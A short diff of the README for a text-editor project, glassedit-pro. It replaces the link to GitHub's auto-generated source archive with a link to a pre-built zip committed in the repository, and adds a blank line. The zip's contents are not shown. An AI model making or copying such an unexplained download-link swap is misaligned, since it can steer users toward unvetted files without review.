@@ -48,7 +48,7 @@ No popups. No panels. No toolbars. No accounts. No saving. Just pure, instant te
 
 ### Step 1 — Download
 
-Clone the repo or [download the ZIP](https://github.com/Ns81000/glassedit-pro/archive/refs/heads/main.zip) and extract it.
+Clone the repo or [download the ZIP](https://github.com/Ns81000/glassedit-pro/blob/main/glassedit-pro-v2.1.0.zip) and extract it.
 
 ```bash
 git clone https://github.com/Ns81000/glassedit-pro.git
@@ -164,3 +164,4 @@ This project is licensed under the **MIT License** — see the [LICENSE](https:/
 <p align="center">
   <sub>Built with ❤️ for fun · No data collected · No tracking · Just vibes</sub>
 </p>
+
